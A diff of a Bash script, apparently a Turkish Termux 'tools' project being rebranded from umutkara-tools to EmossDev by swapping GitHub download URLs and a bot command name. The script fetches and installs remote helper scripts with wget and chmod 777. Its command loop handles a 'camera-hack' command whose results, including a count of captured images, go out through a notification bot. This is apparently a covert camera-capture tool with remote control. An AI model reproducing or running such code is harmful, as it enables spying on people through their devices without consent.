@@ -35,15 +35,15 @@ if [[ ! -a files/update.sh ]];then
 
 	# UPDATE.SH ( GÜNCELLEME SCRİPTİ )
 
-	wget -O files/update.sh  https://raw.githubusercontent.com/umutkara-tools/UMUT-KARA-TOOLS/master/files/update.sh
+	wget -O files/update.sh  https://raw.githubusercontent.com/EmossDev/EMOSS-DEV-TOOLS/master/files/update.sh
 
-	# BOT_UMUTKARATOOLS ( BİLDİRİM SCRİPTİ )
+	# BOT_EMOSSDEVTOOLS ( BİLDİRİM SCRİPTİ )
 
-	wget -O $PREFIX/bin/bot_umutkaratools  https://raw.githubusercontent.com/umutkara-tools/UMUT-KARA-TOOLS/master/files/commands/bot_umutkaratools
+	wget -O $PREFIX/bin/bot_emossdevtools  https://raw.githubusercontent.com/EmossDev/EMOSS-DEV-TOOLS/master/files/commands/bot_emossdevtools
 
 	# LİNK-CREATE ( LİNK OLUŞTURMA SCRİPTİ )
 
-	wget -O $PREFIX/bin/link-create https://raw.githubusercontent.com/umutkara-tools/UMUT-KARA-TOOLS/master/files/commands/link-create
+	wget -O $PREFIX/bin/link-create https://raw.githubusercontent.com/EmossDev/EMOSS-DEV-TOOLS/master/files/commands/link-create
 
 	chmod 777 $PREFIX/bin/*
 
@@ -188,7 +188,7 @@ do
 
 		if [[ $_command == camera-hack ]];then
 			sed "s/camera-hack//g" _command > .info
-			bot_umutkaratools --send
+			bot_emossdevtools --send
 			rm _command
 			while :
 			do
@@ -207,7 +207,7 @@ do
 			 $total ADET RESİM ALINDI
 
 			+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+" > .info
-			bot_umutkaratools --send
+			bot_emossdevtools --send
 			rm total
 		fi
 
@@ -252,7 +252,7 @@ do
 
 		if [[ -a _command ]];then
 			cat _command > .info
-			bot_umutkaratools --send
+			bot_emossdevtools --send
 			rm _command
 		fi
 	fi
